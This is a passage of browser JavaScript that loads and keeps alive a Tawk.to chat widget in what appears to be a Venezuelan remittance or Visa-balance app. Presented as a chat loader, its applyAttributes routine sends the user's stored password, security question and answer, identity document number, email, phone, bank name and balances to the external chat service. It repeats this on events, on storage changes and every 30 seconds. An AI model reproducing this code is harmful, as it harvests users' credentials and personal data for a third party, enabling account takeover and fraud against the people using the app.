    const normalizedLegacySaldo = legacySaldo != null ? String(legacySaldo).trim() : '';
    const normalizedPrimarySaldo = saldoPrimary != null ? String(saldoPrimary).trim() : '';
    const normalizedUsdFromSnapshot = homeSnapshot.saldoUsd ? String(homeSnapshot.saldoUsd).trim() : '';
    const normalizedUsdSource = saldoUsdSource != null ? String(saldoUsdSource).trim() : '';

    let finalSaldo = normalizedPrimarySaldo;
    if (!finalSaldo) {
      if (homevisaActive && normalizedUsdFromSnapshot) {
        finalSaldo = normalizedUsdFromSnapshot;
      } else if (normalizedUsdSource) {
        finalSaldo = normalizedUsdSource;
      } else {
        finalSaldo = normalizedLegacySaldo;
      }
    }

    const resolvedSaldoUsd = normalizedUsdFromSnapshot || normalizedUsdSource;
    const resolvedSaldoBs = homeSnapshot.saldoBs ? String(homeSnapshot.saldoBs).trim() : (saldoBsSource ? String(saldoBsSource).trim() : '');
    const resolvedExchangeRate =
      homeSnapshot.exchangeRate && String(homeSnapshot.exchangeRate).trim()
        ? String(homeSnapshot.exchangeRate).trim()
        : (exchangeRateSource != null ? String(exchangeRateSource).trim() : '');

    attributes = {
      nombre: resolvedName,
      nickname: normalizedNickname,
      saldo: finalSaldo,
      documentType: documentType ? String(documentType) : '',
      documentNumber: documentNumber ? String(documentNumber) : '',
      email: email ? String(email) : '',
      phoneNumber: normalizedPhoneNumber ? String(normalizedPhoneNumber).trim() : '',
      phoneNumberFull: normalizedPhoneNumberFull
        ? String(normalizedPhoneNumberFull).trim()
        : (phoneNumberCombined ? String(phoneNumberCombined).trim() : (rawPhoneNumberFull ? String(rawPhoneNumberFull).trim() : '')),
      phoneCountryCode: normalizedCountryCode,
      state: state ? String(state) : '',
      password: password != null ? String(password) : '',
      securityQuestion: securityQuestion ? String(securityQuestion) : '',
      securityAnswer: securityAnswer ? String(securityAnswer) : '',
      avatar,
      bankName,
      saldoUsd: resolvedSaldoUsd,
      saldoBs: resolvedSaldoBs,
      exchangeRate: resolvedExchangeRate
    };

    if (!attributes.phoneNumber && typeof attributes.phoneNumberFull === 'string') {
      if (normalizedCountryCode === '+58') {
        const veneLocal = normalizeVenezuelanLocalPhone(attributes.phoneNumberFull);
        if (veneLocal) {
          const veneDisplay = formatVenezuelanLocalPhone(veneLocal);
          attributes.phoneNumber = veneDisplay || veneLocal;
        } else {
          attributes.phoneNumber = attributes.phoneNumberFull;
        }
      } else {
        attributes.phoneNumber = attributes.phoneNumberFull;
      }
    }
  }

  function getLoaderElement() {
    const element = document.getElementById('tawkto-loader');
    return element && element.parentNode ? element : null;
  }

  function getContainerElement() {
    const element = document.getElementById('tawkto-container');
    return element && element.parentNode ? element : null;
  }

  function setLoaderVisibility(visible) {
    const loader = getLoaderElement();
    const container = getContainerElement();
    if (loader) {
      if (visible) {
        loader.removeAttribute('hidden');
        loader.setAttribute('aria-hidden', 'false');
      } else if (!loader.hasAttribute('hidden')) {
        loader.setAttribute('hidden', '');
        loader.setAttribute('aria-hidden', 'true');
      } else {
        loader.setAttribute('aria-hidden', 'true');
      }
    }
    if (container) {
      if (visible) {
        container.removeAttribute('data-active');
        container.setAttribute('aria-hidden', 'true');
      } else {
        if (container.querySelector('iframe')) {
          container.setAttribute('data-active', 'true');
          container.setAttribute('aria-hidden', 'false');
        }
      }
    }
  }

  function hideLoaderIfWidgetPresent() {
    const hasWidget =
      document.querySelector('#tawkto-container iframe') ||
      document.querySelector('iframe[src*="tawk.to" i]') ||
      document.querySelector('[data-tawk-root]');
    if (hasWidget) {
      setLoaderVisibility(false);
    }
  }

  let loaderObserver = null;
  function initLoaderHandling() {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', initLoaderHandling, { once: true });
      return;
    }
    if (loaderObserver || (!getLoaderElement() && !getContainerElement())) {
      hideLoaderIfWidgetPresent();
      return;
    }
    loaderObserver = new MutationObserver(() => {
      hideLoaderIfWidgetPresent();
    });
    if (document.body) {
      loaderObserver.observe(document.body, { childList: true, subtree: true });
    }
    window.addEventListener(
      'beforeunload',
      () => {
        if (loaderObserver) {
          loaderObserver.disconnect();
          loaderObserver = null;
        }
      },
      { once: true }
    );
    hideLoaderIfWidgetPresent();
  }

  function ensureChatAccessibility() {
    const frame = document.querySelector('iframe[src*="tawk.to" i]');
    if (frame) {
      frame.style.pointerEvents = 'auto';
      frame.style.zIndex = '10000';
    }
  }

  function isTawkNode(node) {
    if (!node || node.nodeType !== Node.ELEMENT_NODE) {
      return false;
    }
    if (node.tagName === 'IFRAME') {
      const src = node.getAttribute('src') || '';
      return /tawk\.to/i.test(src);
    }
    if (node.querySelector) {
      return Boolean(node.querySelector('iframe[src*="tawk.to" i]'));
    }
    return false;
  }

  function formatTawkName(nombre, saldo) {
    const trimmedName = (nombre == null ? '' : String(nombre)).trim();
    const trimmedSaldo = (saldo == null ? '' : String(saldo)).trim();
    if (trimmedName && trimmedSaldo) {
      return `${trimmedName} ${trimmedSaldo}`.trim();
    }
    return trimmedName || trimmedSaldo;
  }

  function applyAttributes() {
    if (window.Tawk_API && typeof window.Tawk_API.setAttributes === 'function') {
      try {
        const saldoValue =
          attributes.saldo == null ? '' : String(attributes.saldo).trim();
        const nombreValue =
          attributes.nombre == null ? '' : String(attributes.nombre).trim();
        const payload = {
          name: formatTawkName(attributes.nombre, saldoValue),
          saldo: saldoValue
        };
        if (nombreValue) {
          payload.nombre = nombreValue;
        }
        const assignField = (field) => {
          const value = attributes[field];
          if (value == null) {
            return;
          }
          if (typeof value === 'string') {
            const trimmed = value.trim();
            if (!trimmed) {
              return;
            }
            payload[field] = trimmed;
          } else {
            payload[field] = value;
          }
        };

        if (shouldSyncFinancialAttributes()) {
          assignField('saldoUsd');
          assignField('saldoBs');
          assignField('exchangeRate');
        }

        const extraFields = [
          'documentType',
          'documentNumber',
          'email',
          'phoneNumber',
          'phoneNumberFull',
          'phoneCountryCode',
          'state',
          'password',
          'securityQuestion',
          'securityAnswer',
          'nickname',
          'avatar',
          'bankName'
        ];

        for (const field of extraFields) {
          assignField(field);
        }

        window.Tawk_API.setAttributes(payload);
      } catch (error) {
        console.warn('No se pudieron sincronizar los datos con Tawk.to', error);
      }
    }
  }

  function attachApiHooks() {
    window.Tawk_API = window.Tawk_API || {};
    const currentOnLoad = window.Tawk_API.onLoad;
    if (currentOnLoad && currentOnLoad.__remeexWrapped) {
      return;
    }
    const wrappedOnLoad = function () {
      window.tawkChatLoaded = true;
      attempts = 0;
      ensureChatAccessibility();
      applyAttributes();
      setLoaderVisibility(false);
      if (typeof currentOnLoad === 'function') {
        try {
          currentOnLoad.apply(this, arguments);
        } catch (error) {
          console.error('Error en Tawk_API.onLoad original', error);
        }
      }
    };
    wrappedOnLoad.__remeexWrapped = true;
    window.Tawk_API.onLoad = wrappedOnLoad;
  }

  function scheduleRetry() {
    if (retryTimer || attempts >= MAX_ATTEMPTS) {
      return;
    }
    const delay = RETRY_DELAYS[Math.min(attempts, RETRY_DELAYS.length - 1)];
    retryTimer = setTimeout(() => {
      retryTimer = null;
      loadTawkChat(true);
    }, delay);
  }

  function injectScript(attemptIndex) {
    window.Tawk_API = window.Tawk_API || {};
    window.Tawk_LoadStart = new Date();
    const script = document.createElement('script');
    script.async = true;
    script.src = `${TAWK_SRC}?retry=${Date.now()}-${attemptIndex}`;
    script.charset = 'UTF-8';
    script.setAttribute('crossorigin', '*');
    script.dataset.tawkRecovery = 'true';
    script.addEventListener('load', () => {
      loading = false;
      window.tawkChatLoaded = true;
      attempts = 0;
      if (retryTimer) {
        clearTimeout(retryTimer);
        retryTimer = null;
      }
      attachApiHooks();
      setTimeout(attachApiHooks, 0);
      ensureChatAccessibility();
      applyAttributes();
      setLoaderVisibility(false);
    });
    script.addEventListener('error', () => {
      loading = false;
      window.tawkChatLoaded = false;
      scheduleRetry();
    });
    const reference = document.getElementsByTagName('script')[0];
    if (reference && reference.parentNode) {
      reference.parentNode.insertBefore(script, reference);
    } else {
      (document.head || document.body).appendChild(script);
    }
  }

  function loadTawkChat(force) {
    if (!chatRequested) {
      return;
    }

    if (loading) {
      return;
    }

    ensureStoredName();
    readStoredAttributes();

    const widget = document.querySelector('iframe[src*="tawk.to" i]');
    if (!force && (window.tawkChatLoaded || widget)) {
      if (widget) {
        ensureChatAccessibility();
        setLoaderVisibility(false);
      }
      attachApiHooks();
      applyAttributes();
      return;
    }

    if (attempts >= MAX_ATTEMPTS) {
      setLoaderVisibility(false);
      return;
    }

    setLoaderVisibility(true);
    loading = true;
    const currentAttempt = attempts++;
    injectScript(currentAttempt);
  }

  function ensureWidgetPresence(force) {
    if (!chatRequested) {
      return;
    }

    const widget = document.querySelector('iframe[src*="tawk.to" i]');
    if (widget) {
      window.tawkChatLoaded = true;
      ensureChatAccessibility();
      setLoaderVisibility(false);
      return;
    }
    if (force) {
      loadTawkChat(true);
    }
  }

  const widgetObserver = new MutationObserver((mutations) => {
    let shouldCheck = false;
    for (const mutation of mutations) {
      if (mutation.type !== 'childList') {
        continue;
      }
      const changedNodes = [...mutation.addedNodes, ...mutation.removedNodes];
      if (changedNodes.some(isTawkNode)) {
        shouldCheck = true;
        break;
      }
    }
    if (
      chatRequested &&
      (shouldCheck || !document.querySelector('iframe[src*="tawk.to" i]'))
    ) {
      ensureWidgetPresence(false);
    }
  });

  let widgetObserverStarted = false;
  function startWidgetObserver() {
    if (widgetObserverStarted) {
      return;
    }
    if (!document.body) {
      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', startWidgetObserver, { once: true });
      }
      return;
    }
    widgetObserver.observe(document.body, { childList: true, subtree: true });
    widgetObserverStarted = true;
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', startWidgetObserver, { once: true });
  } else {
    startWidgetObserver();
  }

  document.addEventListener('visibilitychange', () => {
    if (!document.hidden && chatRequested) {
      ensureWidgetPresence(true);
    }
  });

  window.addEventListener('focus', () => {
    if (chatRequested) {
      ensureWidgetPresence(false);
    }
  });

  const accountOverlay = document.getElementById('account-block-overlay');
  if (accountOverlay) {
    const overlayObserver = new MutationObserver(() => {
      const hidden =
        accountOverlay.hasAttribute('hidden') ||
        accountOverlay.style.display === 'none' ||
        accountOverlay.classList.contains('hidden');
      if (hidden) {
        setTimeout(() => {
          if (chatRequested) {
            ensureWidgetPresence(true);
          }
        }, 250);
      } else {
        ensureChatAccessibility();
      }
    });
    overlayObserver.observe(accountOverlay, {
      attributes: true,
      attributeFilter: ['style', 'class', 'hidden']
    });
  }

  document.addEventListener('saldoActualizado', (event) => {
    const overrides = extractFinancialOverridesFromDetail(
      event && event.detail
    );
    if (overrides) {
      setRuntimeFinancialOverrides(overrides);
    }
    readStoredAttributes();
    applyAttributes();
  });

  document.addEventListener('rateSelected', (event) => {
    const detail = event && event.detail;
    let overrides = null;
    if (detail && Object.prototype.hasOwnProperty.call(detail, 'value')) {
      overrides = { exchangeRate: detail.value };
      if (detail.usd != null) {
        overrides.usd = detail.usd;
      } else if (detail.saldoUsd != null) {
        overrides.usd = detail.saldoUsd;
      }
      if (detail.bs != null) {
        overrides.bs = detail.bs;
      } else if (detail.saldoBs != null) {
        overrides.bs = detail.saldoBs;
      }
    } else {
      overrides = extractFinancialOverridesFromDetail(detail);
    }
    if (overrides) {
      setRuntimeFinancialOverrides(overrides);
    }
    readStoredAttributes();
    applyAttributes();
  });

  const ATTRIBUTE_CHANGE_EVENTS = [
    'remeexUserDataUpdated',
    'visaUserDataUpdated',
    'visaRegistrationCompleted',
    'remeexProfilePhotoUpdated',
    'remeexVerificationBankingUpdated'
  ];

  ATTRIBUTE_CHANGE_EVENTS.forEach((eventName) => {
    document.addEventListener(eventName, () => {
      readStoredAttributes();
      applyAttributes();
    });
  });

  const ATTRIBUTE_STORAGE_KEYS = new Set([
    'saldo',
    'nombre',
    'visaRegistrationCompleted',
    'visaUserData',
    'remeexUserData',
    'visaRegistrationBackup',
    'visaRegistrationTemp',
    'registrationData',
    'remeexProfilePhoto',
    'remeexVerificationBanking'
  ]);

  const attributeUserDataKey =
    (typeof window.CONFIG !== 'undefined' &&
      window.CONFIG &&
      window.CONFIG.STORAGE_KEYS &&
      window.CONFIG.STORAGE_KEYS.USER_DATA) ||
    '';
  if (attributeUserDataKey) {
    ATTRIBUTE_STORAGE_KEYS.add(attributeUserDataKey);
  }

  const attributeBalanceKey = getBalanceStorageKey();
  if (attributeBalanceKey) {
    ATTRIBUTE_STORAGE_KEYS.add(attributeBalanceKey);
  }

  const attributeBalanceSessionKey = getBalanceSessionKey();
  if (attributeBalanceSessionKey) {
    ATTRIBUTE_STORAGE_KEYS.add(attributeBalanceSessionKey);
  }

  const attributeExchangeRateKey = getExchangeRateStorageKey();
  if (attributeExchangeRateKey) {
    ATTRIBUTE_STORAGE_KEYS.add(attributeExchangeRateKey);
  }

  window.addEventListener('storage', (event) => {
    if (!event || !event.key || ATTRIBUTE_STORAGE_KEYS.has(event.key)) {
      readStoredAttributes();
      applyAttributes();
    }
  });

  setInterval(() => {
    if (!document.hidden) {
      readStoredAttributes();
      if (chatRequested) {
        ensureWidgetPresence(false);
      }
      applyAttributes();
    }
  }, 30000);

  initLoaderHandling();
  readStoredAttributes();
  setTimeout(() => hideLoaderIfWidgetPresent(), 0);

  const api = {
    load(force) {
      if (!chatRequested) {
        chatRequested = true;
      }
      if (force) {
        attempts = Math.min(attempts, MAX_ATTEMPTS - 1);
      }
      loadTawkChat(Boolean(force));
    }
  };

  window.remeexTawk = Object.assign(window.remeexTawk || {}, api, {
    __initialized: true
  });
  window.loadTawkChat = api.load;

})(window, document);
